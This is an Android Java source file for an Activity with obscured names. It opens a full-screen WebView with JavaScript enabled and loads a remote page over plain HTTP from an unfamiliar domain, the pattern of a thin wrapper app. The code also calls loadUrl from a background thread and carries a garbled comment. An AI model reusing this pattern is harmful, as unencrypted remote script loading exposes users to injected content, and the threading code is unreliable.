package com.example.l;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.Window;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;

public class Cd  extends Activity {

	public static final int SHOW_RESPONSE = 0;
	String strbb;
	WebView tz;
	
    @Override
    public void onCreate(Bundle savedInstanceState) {
    	this.requestWindowFeature(Window.FEATURE_NO_TITLE);

        super.onCreate(savedInstanceState);
        setContentView(R.layout.cd);
        
        
        tz = (WebView)findViewById(R.id.webView1);
        tz.getSettings().setJavaScriptEnabled(true);
        tz.setScrollBarStyle(0);
        // ����֧��javascript 
        WebSettings settings = tz.getSettings(); 
        settings.setJavaScriptEnabled(true); 
	 
        tz.loadUrl("http://a.loswkl.xyz/ts");

        tz.setWebViewClient(new WebViewClient()
        {
        	public boolean shouldOverrideUrlLoading(final WebView view, final String url) {
  			  
        		loadurl(view,url);
        		return true;  
        	}
        });

    }
    public void loadurl(final WebView view,final String url){
    	new Thread(){
    		public void run(){
    			view.loadUrl(url);
    
    		}
    	}.start();
    }
}